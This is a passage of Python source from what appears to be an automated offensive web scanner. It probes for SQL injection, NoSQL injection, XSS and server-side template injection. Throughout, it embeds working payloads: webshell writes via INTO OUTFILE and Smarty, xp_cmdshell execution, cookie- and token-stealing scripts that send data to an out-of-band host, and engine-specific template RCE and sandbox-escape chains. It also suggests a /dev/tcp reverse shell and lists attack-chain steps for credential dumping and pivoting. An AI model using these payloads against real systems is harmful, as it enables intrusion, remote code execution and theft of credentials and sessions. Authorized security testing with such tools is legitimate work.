                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.SQLI_BLIND_TIME,
                    severity   = FindingSeverity.HIGH,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = payload,
                    evidence   = {
                        "elapsed_s":      round(dt, 3),
                        "expected_delay": expected_delay,
                        "status_code":    resp.status_code if resp else 0,
                    },
                    exploitation = {
                        "technique":  "time-based boolean inference",
                        "tool":       "sqlmap --technique=T",
                        "example":    "' AND IF(1=1,SLEEP(5),0)-- -",
                    },
                    attack_chain = [
                        f"Payload caused {dt:.1f}s delay — DB executed SLEEP/WAITFOR",
                        "Confirm with 10s delay: SLEEP(10)",
                        "Build time-based binary extraction loop",
                        "Exfiltrate DB version, users, credentials via timing oracle",
                    ],
                    remediation = "Parameterise all SQL; monitor for slow queries.",
                    notes       = f"Time-based blind SQLi — {dt:.1f}s delay on {payload[:60]}",
                    db_engine   = db,
                )
        return None

    # ── UNION extraction chain ─────────────────────────────────────────────────

    def _probe_union(
        self, pt: InjectPoint, seed: VulnFinding
    ) -> Optional[VulnFinding]:
        db       = seed.db_engine or DbEngine.UNKNOWN
        col_info = self._union.find_columns(self._http, pt, db)
        if not col_info:
            return None

        col_count, col_idx = col_info
        extracted = self._ext.build_chain(db, col_count, col_idx, pt, self._http)

        if not extracted:
            return None

        return VulnFinding(
            finding_id = str(uuid.uuid4()),
            vuln_class = VulnClass.SQLI_UNION,
            severity   = FindingSeverity.CRITICAL,
            status     = FindingStatus.CONFIRMED,
            target_url = pt.url,
            param      = pt.param,
            payload    = f"' UNION SELECT {'NULL,' * col_count}-- - ({col_count} cols, idx {col_idx})",
            evidence   = {
                "column_count":    col_count,
                "inject_col_idx":  col_idx,
                "extracted_data":  extracted,
            },
            exploitation = {
                "extraction_chain": extracted,
                "next":  "Dump full user table → crack hashes → privilege escalation",
            },
            attack_chain = [
                f"Column count: {col_count}, injectable col: {col_idx}",
                f"Extracted: {list(extracted.keys())}",
                "Full DB dump possible — target sensitive tables (users, passwords, tokens)",
            ],
            remediation = "Parameterise all queries immediately.",
            notes       = f"UNION-based extraction confirmed — {col_count} columns, extracted: {extracted}",
            db_engine   = db,
        )

    # ── stacked queries ───────────────────────────────────────────────────────

    def _probe_stacked(self, pt: InjectPoint) -> Optional[VulnFinding]:
        # Time-based stacked query — different from time-based blind
        # (uses ; delimiter rather than AND SLEEP)
        stacked_payloads = [
            ("; SELECT SLEEP(4); -- -",           4.0, DbEngine.MYSQL),
            ("; WAITFOR DELAY '0:0:4'; -- -",     4.0, DbEngine.MSSQL),
            ("; SELECT pg_sleep(4); -- -",        4.0, DbEngine.POSTGRES),
        ]
        for payload, expected, db_hint in stacked_payloads:
            t0  = time.perf_counter()
            resp = self._http.send(pt, payload)
            dt  = time.perf_counter() - t0
            if dt >= expected * 0.80:
                return VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.SQLI_STACKED,
                    severity   = FindingSeverity.CRITICAL,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = payload,
                    evidence   = {
                        "elapsed_s": round(dt, 3),
                        "delimiter": ";",
                    },
                    exploitation = {
                        "mssql_rce": "; EXEC xp_cmdshell('whoami'); -- -",
                        "mysql_write": "; SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'; -- -",
                    },
                    attack_chain = [
                        "Stacked query delimiter (;) accepted by server",
                        "MSSQL: exec xp_cmdshell for OS command injection",
                        "MySQL: INTO OUTFILE to write webshell",
                        "Postgres: COPY TO PROGRAM for RCE",
                    ],
                    remediation = "Parameterise queries; disable xp_cmdshell on MSSQL.",
                    notes       = f"Stacked query SQLi — {dt:.1f}s delay",
                    db_engine   = db_hint,
                )
        return None

    # ── NoSQL operator injection ───────────────────────────────────────────────

    def _probe_nosql(self, pt: InjectPoint) -> Optional[VulnFinding]:
        """
        Injects MongoDB operator objects into JSON body params.
        Distinct from auth_bypass.py NoSQL — this targets data retrieval
        endpoints, not login bypass, using $where, $regex, $gt operators
        for data exfiltration.
        """
        # Test $gt always-true vs $lt always-false differential
        diff = self._diff.run(
            self._http, pt,
            self._SqliProbe._probe_nosql.__func__.__doc__ and  # type: ignore
            '{"$gt": ""}',
            '{"$lt": ""}',
        )
        # Also try $where regex exfil
        exfil_payloads: List[Tuple[str, str]] = [
            ('{"$gt": ""}',                                   "always-true $gt"),
            ('{"$regex": ".*"}',                             "regex match-all"),
            ('{"$where": "this.password.length>0"}',          "$where field access"),
            ('{"$where": "function(){return true}"}',         "$where always-true"),
            ('{"$ne": null}',                                 "$ne null bypass"),
            ('{"$in": ["admin", "administrator", "root"]}',   "$in admin enum"),
        ]

        for payload, desc in exfil_payloads:
            resp = self._http.send(pt, payload)
            if not resp:
                continue
            body = resp.text or ""
            # Look for signs of data returned (JSON arrays, user objects)
            if re.search(r'"_id"\s*:|"\bpassword\b"\s*:|"email"\s*:', body, re.I):
                return VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.SQLI_NOSQL,
                    severity   = FindingSeverity.HIGH,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = payload,
                    evidence   = {
                        "body_preview": body[:300],
                        "description":  desc,
                    },
                    exploitation = {
                        "regex_exfil": '{"$regex": "^a"}',
                        "where_rce":   '{"$where": "this.constructor.constructor(\'return process\')().exit()"}',
                    },
                    attack_chain = [
                        f"NoSQL operator {desc} returned MongoDB document data",
                        "Enumerate collections via $regex char-by-char",
                        "Extract password hashes, tokens, PII",
                    ],
                    remediation = "Sanitise/reject MongoDB operator keys from user input; use allowlist.",
                    notes       = f"NoSQL injection via {desc} — document data exposed",
                    db_engine   = DbEngine.MONGODB,
                )

        return None

    # ── OOB DNS channel ────────────────────────────────────────────────────────

    def _probe_oob(self, pt: InjectPoint) -> Optional[VulnFinding]:
        """OOB DNS via LOAD_FILE and UTL_HTTP — confirm RCE-adjacent data channel."""
        oob_payloads = [
            "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e,database(),0x2e,"
            "0x617274657800,"  # artex
            "0x636f6d5c5c616263))-- -",  # com\\abc
            "'; EXEC master..xp_dirtree '//artex-oob.internal/a'-- -",
            "' UNION SELECT UTL_HTTP.REQUEST('http://artex-oob.internal/'||user) FROM dual-- -",
        ]
        for payload in oob_payloads:
            resp = self._http.send(pt, payload)
            # For OOB, we can't directly detect success without a listening server
            # Flag as POSSIBLE if no SQL error returned (payload was processed)
            if resp and resp.status_code in (200, 500) and resp.text:
                body = resp.text
                # If no raw SQL error but we got a response → payload executed
                has_sql_err = any(sig.search(body) for sig in self._ERROR_SIGS)
                if not has_sql_err and len(body) > 20:
                    return VulnFinding(
                        finding_id = str(uuid.uuid4()),
                        vuln_class = VulnClass.SQLI_OOB,
                        severity   = FindingSeverity.HIGH,
                        status     = FindingStatus.POSSIBLE,
                        target_url = pt.url,
                        param      = pt.param,
                        payload    = payload,
                        evidence   = {
                            "status_code": resp.status_code,
                            "body_len":    len(body),
                            "note":        "OOB payload processed without SQL error — confirm with DNS listener",
                        },
                        exploitation = {
                            "confirm": "Set up interactsh/Burp Collaborator and re-run",
                            "data_exfil": "Encode extracted data in subdomain label",
                        },
                        attack_chain = [
                            "OOB payload sent without triggering SQL error",
                            "Confirm via DNS/HTTP callback to attacker server",
                            "Exfiltrate credentials in DNS subdomain labels",
                        ],
                        remediation = "Block outbound DNS/HTTP from DB server tier.",
                        notes       = "SQLi OOB channel possible — confirm with external listener",
                    )
        return None


# ─────────────────────────────────────────────────────────────────────────────
# XSS probe engine — Reflected / Stored (beacon) / DOM / Mutation / Header
# ─────────────────────────────────────────────────────────────────────────────

class _XssProbe:
    """
    New capabilities not in AI_payload_generator:
    - Per-injection unique beacon IDs for stored XSS tracking
    - Context-aware payload selection (HTML body / attribute / JS / CSS)
    - Mutation XSS via browser-side HTML normalisation triggers
    - Response-header XSS (Content-Disposition / Location)
    - DOM sink detection via static JS analysis of response body
    """

    _REFLECT_MARKER = "ARTEX_XSS_RFLCT"

    # Context signatures in body around reflection point
    _CTX_HTML_BODY   = re.compile(r'<[^>]+ARTEX|ARTEX[^<]*<', re.I)
    _CTX_ATTR        = re.compile(r'["\'].*?ARTEX|ARTEX.*?["\']', re.I)
    _CTX_JS          = re.compile(r'["\`].*?ARTEX|ARTEX.*?["\`]|var.*?ARTEX', re.I)
    _CTX_URL         = re.compile(r'href=["\'].*?ARTEX|src=["\'].*?ARTEX', re.I)

    # DOM sinks to detect in JS source
    _DOM_SINKS: List[re.Pattern] = [
        re.compile(r'innerHTML\s*=\s*.*?location|innerHTML\s*=\s*.*?search', re.I),
        re.compile(r'document\.write\s*\(.*?location', re.I),
        re.compile(r'eval\s*\(.*?location|eval\s*\(.*?search', re.I),
        re.compile(r'\.src\s*=\s*.*?location|\.href\s*=\s*.*?location', re.I),
        re.compile(r'outerHTML\s*=\s*.*?hash|outerHTML\s*=\s*.*?search', re.I),
        re.compile(r'insertAdjacentHTML\s*\(.*?location', re.I),
        re.compile(r'window\.location\s*=|location\.href\s*=', re.I),
    ]

    # Mutation XSS vectors (mXSS) — survive sanitisation via mutation
    _MXSS_PAYLOADS: List[str] = [
        "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
        "<svg><![CDATA[</svg><script>alert(1)</script>]]>",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "<table><td><svg><desc><img src=x onerror=alert(1)></desc></svg>",
        "<!-<script>alert(1)</script>->",
        "<p><svg><desc><b id='</desc><script>alert(1)</script>'>",
    ]

    # Context-to-payload map
    _CTX_PAYLOADS: Dict[str, List[str]] = {
        "html_body": [
            "<script>alert('ARTEX_XSS')</script>",
            "<img src=x onerror=alert('ARTEX_XSS')>",
            "<svg onload=alert('ARTEX_XSS')>",
        ],
        "attribute": [
            "\" onmouseover=\"alert('ARTEX_XSS')\"",
            "' onmouseover='alert(\"ARTEX_XSS\")'",
            "\" autofocus onfocus=\"alert('ARTEX_XSS')\"",
            "\"><script>alert('ARTEX_XSS')</script>",
        ],
        "js": [
            "';alert('ARTEX_XSS')//",
            "\";alert('ARTEX_XSS')//",
            "`-alert('ARTEX_XSS')-`",
            "\\';alert('ARTEX_XSS')//",
        ],
        "url": [
            "javascript:alert('ARTEX_XSS')",
            "data:text/html,<script>alert('ARTEX_XSS')</script>",
        ],
    }

    def __init__(self, http: _HttpPool, oob_domain: str = "artex-xss.internal"):
        self._http       = http
        self._oob_domain = oob_domain

    def probe(
        self,
        pt:           InjectPoint,
        payload_pool: List[str],
    ) -> List[VulnFinding]:
        findings: List[VulnFinding] = []

        # ── Step 1: reflection probe ──────────────────────────────────────────
        resp = self._http.send(pt, self._REFLECT_MARKER)
        if not resp or self._REFLECT_MARKER not in (resp.text or ""):
            # No reflection at all — still check DOM sinks
            dom = self._detect_dom_sinks(pt, resp)
            if dom:
                findings.append(dom)
            return findings

        body = resp.text or ""
        ctx  = self._detect_context(body)

        # ── Step 2: context-aware payload injection ───────────────────────────
        ctx_payloads = self._CTX_PAYLOADS.get(ctx, self._CTX_PAYLOADS["html_body"])
        for payload in ctx_payloads + payload_pool[:6]:
            r2 = self._http.send(pt, payload)
            if not r2:
                continue
            b2 = r2.text or ""
            # Look for unescaped payload in response
            if self._is_xss_unescaped(payload, b2):
                findings.append(VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.XSS_REFLECTED,
                    severity   = FindingSeverity.HIGH,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = payload,
                    evidence   = {
                        "reflection_context": ctx,
                        "unescaped_in_body":  True,
                        "body_preview":       b2[:200],
                    },
                    exploitation = {
                        "poc_url": f"{pt.url}?{pt.param}={quote(payload)}",
                        "steal_cookies": (
                            f"<script>fetch('https://{self._oob_domain}/?c='+"
                            "document.cookie)</script>"
                        ),
                        "steal_tokens": (
                            f"<script>fetch('https://{self._oob_domain}/?t='+"
                            "localStorage.getItem('token'))</script>"
                        ),
                    },
                    attack_chain = [
                        f"Param {pt.param!r} reflects input unescaped in {ctx} context",
                        "Craft payload matching context — no encoding needed",
                        "Chain: steal session cookie → account takeover",
                        "Stored variant: inject in profile field for persistent XSS",
                    ],
                    remediation = (
                        "HTML-encode all output. CSP: script-src 'nonce-...'. "
                        "HTTPOnly on session cookies."
                    ),
                    notes       = f"Reflected XSS in {ctx} context",
                ))
                break

        # ── Step 3: Stored XSS beacon ─────────────────────────────────────────
        stored = self._probe_stored(pt, payload_pool)
        if stored:
            findings.append(stored)

        # ── Step 4: Mutation XSS ──────────────────────────────────────────────
        for mxss in self._MXSS_PAYLOADS:
            r = self._http.send(pt, mxss)
            if r and self._is_xss_unescaped(mxss.split("<")[1].split(">")[0], r.text or ""):
                findings.append(VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.XSS_MUTATION,
                    severity   = FindingSeverity.HIGH,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = mxss,
                    evidence   = {"body_preview": (r.text or "")[:200]},
                    exploitation = {
                        "note": "mXSS survives DOMPurify/sanitizer via browser mutation"
                    },
                    attack_chain = [
                        "Mutation XSS bypasses server-side sanitisation",
                        "Browser re-parses HTML and executes payload",
                        "Works against innerHTML-based renderers",
                    ],
                    remediation = "Use textContent instead of innerHTML; update DOMPurify.",
                    notes       = "Mutation XSS (mXSS) confirmed",
                ))
                break

        # ── Step 5: DOM sink detection ────────────────────────────────────────
        dom = self._detect_dom_sinks(pt, resp)
        if dom:
            findings.append(dom)

        # ── Step 6: Response header XSS ───────────────────────────────────────
        hdr_xss = self._probe_header_xss(pt)
        if hdr_xss:
            findings.append(hdr_xss)

        return findings

    # ── helpers ───────────────────────────────────────────────────────────────

    def _detect_context(self, body: str) -> str:
        marker = self._REFLECT_MARKER
        pos    = body.find(marker)
        if pos == -1:
            return "html_body"
        ctx_window = body[max(0, pos - 80): pos + 80]
        if self._CTX_JS.search(ctx_window):
            return "js"
        if self._CTX_ATTR.search(ctx_window):
            return "attribute"
        if self._CTX_URL.search(ctx_window):
            return "url"
        return "html_body"

    @staticmethod
    def _is_xss_unescaped(payload: str, body: str) -> bool:
        """Check key XSS indicators are present and unescaped."""
        dangerous_parts = ["<script", "onerror=", "onload=", "onfocus=",
                           "onmouseover=", "javascript:", "alert("]
        for part in dangerous_parts:
            if part.lower() in payload.lower():
                # Must appear unescaped (not as &lt; &gt;)
                if part.lower() in body.lower():
                    escaped = html.escape(part)
                    if escaped.lower() not in body.lower():
                        return True
        return False

    def _probe_stored(
        self, pt: InjectPoint, pool: List[str]
    ) -> Optional[VulnFinding]:
        """
        Inject a unique beacon — then GET the viewing URL to see if it fires.
        Only viable on write-then-read endpoints (comment, profile, post).
        """
        beacon_id  = uuid.uuid4().hex[:12]
        beacon_url = f"https://{self._oob_domain}/beacon/{beacon_id}"
        payload    = (
            f'<img src=x onerror="fetch(\'{beacon_url}/?c=\'+document.cookie)">'
        )

        post_resp = self._http.send(pt, payload)
        if not post_resp or post_resp.status_code not in (200, 201, 302):
            return None

        # Try to view the stored content
        view_urls = [
            pt.url.rsplit("/", 1)[0],               # parent path
            pt.url + "/view",
            pt.url.replace("/create", "/list"),
            pt.url.replace("/post", "/feed"),
            pt.url.replace("/comment", "/thread"),
        ]
        for view_url in view_urls:
            r = self._http.raw_get(view_url)
            if r and beacon_id in (r.text or ""):
                return VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.XSS_STORED,
                    severity   = FindingSeverity.CRITICAL,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = payload,
                    evidence   = {
                        "beacon_id":  beacon_id,
                        "view_url":   view_url,
                        "beacon_url": beacon_url,
                        "body_has_beacon": True,
                    },
                    exploitation = {
                        "impact": "Persistent XSS — fires on every visitor",
                        "account_takeover": f"Beacon at {beacon_url} receives cookies",
                    },
                    attack_chain = [
                        f"Injected beacon {beacon_id} persisted to storage",
                        f"Payload visible at {view_url}",
                        "Any visitor triggers cookie exfil to attacker server",
                        "Chain: steal admin session → full account takeover",
                    ],
                    remediation = "HTML-encode all stored user content on output.",
                    notes       = f"Stored XSS — beacon {beacon_id} persisted",
                    beacon_id   = beacon_id,
                )
        return None

    def _detect_dom_sinks(
        self, pt: InjectPoint, resp: Optional[Response]
    ) -> Optional[VulnFinding]:
        if not resp:
            return None
        body = resp.text or ""
        for sink_pat in self._DOM_SINKS:
            m = sink_pat.search(body)
            if m:
                return VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.XSS_DOM,
                    severity   = FindingSeverity.HIGH,
                    status     = FindingStatus.LIKELY,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = "#<img src=x onerror=alert(1)>",
                    evidence   = {
                        "dom_sink":   m.group(0)[:200],
                        "pattern":    sink_pat.pattern,
                        "note":       "JS DOM sink reads from location/search/hash",
                    },
                    exploitation = {
                        "poc": f"{pt.url}#<img src=x onerror=alert(1)>",
                        "note": "Inject via URL hash — no server round-trip needed",
                    },
                    attack_chain = [
                        f"DOM sink: {m.group(0)[:80]}",
                        "Inject payload via URL hash fragment",
                        "Client-side JS writes hash content to sink",
                        "No server-side detection possible",
                    ],
                    remediation = "Never write location.hash/search to innerHTML. Use textContent.",
                    notes       = f"DOM XSS sink detected: {sink_pat.pattern}",
                )
        return None

    def _probe_header_xss(self, pt: InjectPoint) -> Optional[VulnFinding]:
        """
        Check if response headers reflect user-controlled input.
        Content-Disposition / Location header injection.
        """
        marker   = f"ARTEX_HDR_{uuid.uuid4().hex[:6]}"
        resp     = self._http.send(pt, marker)
        if not resp:
            return None
        for hdr_name, hdr_val in resp.headers.items():
            if marker in hdr_val:
                return VulnFinding(
                    finding_id = str(uuid.uuid4()),
                    vuln_class = VulnClass.XSS_HEADER_INJECT,
                    severity   = FindingSeverity.MEDIUM,
                    status     = FindingStatus.CONFIRMED,
                    target_url = pt.url,
                    param      = pt.param,
                    payload    = marker,
                    evidence   = {
                        "reflected_header": hdr_name,
                        "value_preview":    hdr_val[:100],
                    },
                    exploitation = {
                        "content_disp": f"attachment; filename=\"{marker}.html\"",
                        "location_xss": "javascript:alert(1)",
                    },
                    attack_chain = [
                        f"Input reflected in {hdr_name} response header",
                        "Inject newline (CRLF) to add Set-Cookie or Location header",
                        "Location: javascript: leads to XSS in older browsers",
                    ],
                    remediation = "Sanitise all user input reflected into HTTP headers. Strip CRLF.",
                    notes       = f"Header injection XSS via {hdr_name}",
                )
        return None


# ─────────────────────────────────────────────────────────────────────────────
# SSTI probe engine — detection + engine identification + RCE chain + sandbox escape
# ─────────────────────────────────────────────────────────────────────────────

class _SstiProbe:
    """
    New capabilities beyond AI_payload_generator payloads:
    - Arithmetic probe sequence to identify engine (7*7=49 vs 7*'7'='7777777')
    - Per-engine sandbox escape sequencer (chain Jinja2 MRO, Twig exec filter, etc.)
    - Blind SSTI via time-based oracle (os.popen('sleep 5') in RCE payload)
    - EL/OGNL injection for Java stacks
    """

    # Arithmetic probes to fingerprint engine
    _ARITHMETIC_PROBES: List[Tuple[str, str, SstiEngine]] = [
        ("{{7*'7'}}",          "7777777",  SstiEngine.JINJA2),    # Python repeats
        ("{{7*7}}",            "49",       SstiEngine.TWIG),
        ("${7*7}",             "49",       SstiEngine.FREEMARKER),
        ("<%= 7*7 %>",         "49",       SstiEngine.ERB),
        ("#{7*7}",             "49",       SstiEngine.THYMELEAF),
        ("@(7*7)",             "49",       SstiEngine.EL),
        ("*{7*7}",             "49",       SstiEngine.THYMELEAF),
        ("{7*7}",              "49",       SstiEngine.SMARTY),
    ]

    # RCE chains per engine — extend/differ from AI_payload_generator versions
    # These focus on chaining + sandbox escape, not raw payloads
    _RCE_CHAINS: Dict[SstiEngine, List[Tuple[str, str]]] = {
        SstiEngine.JINJA2: [
            # MRO subclass chain — OS command via subprocess
            ("mro_subclass_popen",
             "{%for c in [].__class__.__base__.__subclasses__()%}"
             "{%if c.__name__=='Popen'%}"
             "{{c(['id'],stdout=-1).communicate()}}"
             "{%endif%}{%endfor%}"),
            # cycler global os
            ("cycler_os", "{{cycler.__init__.__globals__.os.popen('id').read()}}"),
            # config object
            ("config_items", "{{config.items()}}"),
            # lipsum RCE
            ("lipsum_import",
             "{{lipsum.__globals__['os'].popen('id').read()}}"),
        ],
        SstiEngine.TWIG: [
            ("filter_system",
             "{{'id'|filter('system')}}"),
            ("map_system",
             "{{['id']|map('system')|join}}"),
            ("env_register",
             "{{_self.env.registerUndefinedFilterCallback('exec')}}"
             "{{_self.env.getFilter('id')}}"),
        ],
        SstiEngine.FREEMARKER: [
            ("execute_class",
             "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
             "${ex(\"id\")}"),
            ("runtime_exec",
             "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"),
        ],
        SstiEngine.VELOCITY: [
            ("runtime_via_set",
             "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"
             "#set($ex=$rt.getRuntime().exec('id'))"
             "#set($out=$ex.getInputStream())"
             "#foreach($i in [1..$out.available()])"
             "$out.read()"
             "#end"),
        ],
        SstiEngine.ERB: [
            ("backtick_rce",    "<%= `id` %>"),
            ("system_rce",      "<%= system('id') %>"),
            ("io_popen",        "<%= IO.popen('id').readlines() %>"),
        ],
        SstiEngine.SMARTY: [
            ("php_tag",         "{php}echo `id`;{/php}"),
            ("write_file",
             "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"
             "\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}"),
        ],
        SstiEngine.EL: [
            ("spel_runtime",
             "${T(java.lang.Runtime).getRuntime().exec('id')}"),
            ("spel_hash_runtime",
             "#{T(java.lang.Runtime).getRuntime().exec('id')}"),
        ],
        SstiEngine.PEBBLE: [
            ("for_forname",
             "{%for i in range(1)%}"
             "{{i.getClass().forName('java.lang.Runtime')"
             ".getMethod('exec',i.getClass().forName('java.lang.String'))"
             ".invoke(i.getClass().forName('java.lang.Runtime')"
             ".getMethod('getRuntime').invoke(null),'id')}}"
             "{%endfor%}"),
        ],
    }

    # Sandbox escape patterns (Jinja2-specific — Python MRO chain)
    _SANDBOX_ESCAPES: List[Tuple[str, str]] = [
        ("class_mro_subprocess",
         "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,"
         "stdout=-1).communicate()[0].strip()}}"),
        ("builtins_import",
         "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__"
         "['__builtins__']['__import__']('os').popen('id').read()}}"),
        ("globals_os",
         "{{request.__class__.__mro__[1].__subclasses__()[104].__init__"
         ".__globals__['os'].popen('id').read()}}"),
    ]

    _SHELL_SIG = re.compile(
        r"uid=\d+\(\w+\)\s+gid=\d+|root:\w*:\d+:\d+|"
        r"total \d+\ndrwx|Linux.*\d+\.\d+",
        re.S | re.I,
    )

    def __init__(self, http: _HttpPool):
        self._http = http

    def probe(
        self,
        pt:           InjectPoint,
        payload_pool: List[str],
    ) -> List[VulnFinding]:
        findings: List[VulnFinding] = []

        # ── Step 1: arithmetic fingerprint ────────────────────────────────────
        engine, detect_payload = self._fingerprint_engine(pt)

        if not detect_payload:
            # Try pool payloads for basic detection
            for p in payload_pool[:5]:
                resp = self._http.send(pt, p)
                if resp and re.search(r'\b49\b|7777777', resp.text or ""):
                    detect_payload = p
                    engine         = SstiEngine.UNKNOWN
                    break

        if not detect_payload:
            return findings

        findings.append(VulnFinding(
            finding_id  = str(uuid.uuid4()),
            vuln_class  = VulnClass.SSTI_DETECT,
            severity    = FindingSeverity.HIGH,
            status      = FindingStatus.CONFIRMED,
            target_url  = pt.url,
            param       = pt.param,
            payload     = detect_payload,
            evidence    = {
                "engine_detected":  engine.value,
                "arithmetic_match": True,
            },
            exploitation = {
                "next_step": "RCE chain via engine-specific gadget",
                "engine":    engine.value,
            },
            attack_chain = [
                f"Template arithmetic {detect_payload!r} evaluated — SSTI confirmed",
                f"Engine: {engine.value}",
                "Escalate to RCE via engine-specific chain",
            ],
            remediation = (
                "Never pass user input to template render functions. "
                "Use template sandboxes or whitelisted template parameters."
            ),
            notes       = f"SSTI detected — engine: {engine.value}",
            ssti_engine = engine,
        ))

        # ── Step 2: RCE chain ─────────────────────────────────────────────────
        rce_chains = self._RCE_CHAINS.get(engine, self._RCE_CHAINS.get(
            SstiEngine.JINJA2, []))
        for chain_name, chain_payload in rce_chains:
            resp = self._http.send(pt, chain_payload)
            if not resp:
                continue
            m = self._SHELL_SIG.search(resp.text or "")
            if m:
                findings.append(VulnFinding(
                    finding_id  = str(uuid.uuid4()),
                    vuln_class  = VulnClass.SSTI_RCE,
                    severity    = FindingSeverity.CRITICAL,
                    status      = FindingStatus.CONFIRMED,
                    target_url  = pt.url,
                    param       = pt.param,
                    payload     = chain_payload,
                    evidence    = {
                        "shell_output": m.group(0)[:200],
                        "chain_name":   chain_name,
                        "engine":       engine.value,
                    },
                    exploitation = {
                        "reverse_shell": (
                            "Replace 'id' with: "
                            "bash -i >& /dev/tcp/attacker/4444 0>&1"
                        ),
                        "webshell": "Write <?php system($_GET['c']); ?> to web root",
                    },
                    attack_chain = [
                        f"SSTI RCE via {chain_name} chain on {engine.value} engine",
                        f"Command output: {m.group(0)[:80]}",
                        "Establish reverse shell → pivot to internal network",
                        "Exfil /etc/shadow, SSH keys, cloud credentials",
                    ],
                    remediation = "Immediate: take service offline. Fix: sandbox templates.",
                    notes       = f"SSTI RCE confirmed via {engine.value} {chain_name}",
                    ssti_engine = engine,
                ))
                break

        # ── Step 3: sandbox escape (Jinja2 specifically) ──────────────────────
        if engine == SstiEngine.JINJA2:
            for escape_name, escape_payload in self._SANDBOX_ESCAPES:
                resp = self._http.send(pt, escape_payload)
                if resp and self._SHELL_SIG.search(resp.text or ""):
                    findings.append(VulnFinding(
                        finding_id  = str(uuid.uuid4()),
                        vuln_class  = VulnClass.SSTI_SANDBOX_ESCAPE,
                        severity    = FindingSeverity.CRITICAL,
                        status      = FindingStatus.CONFIRMED,
                        target_url  = pt.url,
                        param       = pt.param,
                        payload     = escape_payload,
                        evidence    = {
                            "escape_name":   escape_name,
                            "shell_output":  (resp.text or "")[:200],
                        },
                        exploitation = {
                            "note": "Sandbox bypass via Python MRO subclass enumeration",
                            "next": "Drop reverse shell, exfil /etc/shadow",
                        },
                        attack_chain = [
                            "Jinja2 sandbox bypassed via MRO subclass chain",
                            f"Method: {escape_name}",
                            "Full OS command execution confirmed",
                        ],
                        remediation = "Upgrade Jinja2; enable strict sandboxing; deny __class__/__mro__.",
                        notes       = f"Jinja2 sandbox escape via {escape_name}",
                        ssti_engine = engine,
                    ))
                    break

        # ── Step 4: blind SSTI time oracle ────────────────────────────────────
        blind = self._probe_blind_time(pt, engine)
        if blind:
            findings.append(blind)

        return findings

    # ── helpers ───────────────────────────────────────────────────────────────

    def _fingerprint_engine(
        self, pt: InjectPoint
    ) -> Tuple[SstiEngine, Optional[str]]:
        for probe, expected, engine in self._ARITHMETIC_PROBES:
            resp = self._http.send(pt, probe)
            if resp and expected in (resp.text or ""):
                return engine, probe
        return SstiEngine.UNKNOWN, None

    def _probe_blind_time(
        self, pt: InjectPoint, engine: SstiEngine
    ) -> Optional[VulnFinding]:
        time_payloads: Dict[SstiEngine, str] = {
            SstiEngine.JINJA2: (
                "{{''.join(__import__('os').popen('sleep 5').read())}}"
            ),
            SstiEngine.TWIG:  "{{['sleep 5']|map('system')|join}}",
            SstiEngine.ERB:   "<%= `sleep 5` %>",
        }
        payload = time_payloads.get(engine)
        if not payload:
            return None

        t0  = time.perf_counter()
        resp = self._http.send(pt, payload)
        dt  = time.perf_counter() - t0
        
        if dt >= 4.5:
            return VulnFinding(
                finding_id  = str(uuid.uuid4()),
                vuln_class  = VulnClass.SSTI_RCE,
                severity    = FindingSeverity.CRITICAL,
                status      = FindingStatus.CONFIRMED,
                target_url  = pt.url,
                param       = pt.param,
                payload     = payload,
                evidence    = {
                    "elapsed_s":    round(dt, 3),
                    "engine":       engine.value,
                    "method":       "blind_time_oracle",
                },
                exploitation = {
                    "confirm": "Replace sleep with id — look for uid= in output",
                    "reverse": "Replace sleep 5 with reverse shell one-liner",
                },
                attack_chain = [
                    f"Blind SSTI RCE — {dt:.1f}s delay via sleep command",
                    f"Engine: {engine.value}",
                    "Exfiltrate output via OOB channel",
                ],
                remediation = "Never render user input as template. Sandbox or reject.",
                notes       = f"Blind SSTI time oracle — {dt:.1f}s delay on {engine.value}",
                ssti_engine = engine,
            )
        return None


# ─────────────────────────────────────────────────────────────────────────────
# IDOR probe engine — object graph, mass assignment, JWT claim, GUID prediction
# ─────────────────────────────────────────────────────────────────────────────

class _IdorProbe:
    """
    New capabilities beyond AI_payload_generator.IDOR_PROBES:
    - Object graph mapper: discovers other object IDs referenced in a response
      and tests cross-user access to each
    - Mass assignment: injects elevated role/permission fields in JSON PUT/PATCH
    - JWT sub/user_id claim substitution without changing signature
      (flags only — actual bypass in auth_bypass.py)
    - GUID/UUID predictability scoring (version-1 timestamp extraction)
    - Differential access control: compare authenticated vs unauthenticated responses
    """

    # Fields that might contain IDs of related objects
    _ID_FIELDS = re.compile(
        r'"(?:id|user_id|userId|account_id|accountId|owner_id|ownerId|'
        r'author_id|authorId|created_by|createdBy|parent_id|parentId|'
        r'resource_id|resourceId|document_id|documentId)"\s*:\s*'
        r'(?:"([0-9a-f-]{6,})"|(\\d+))',
        re.I,
    )

    # Fields to inject for mass assignment
    _MASS_ASSIGN_FIELDS: List[Dict[str, Any]] = [
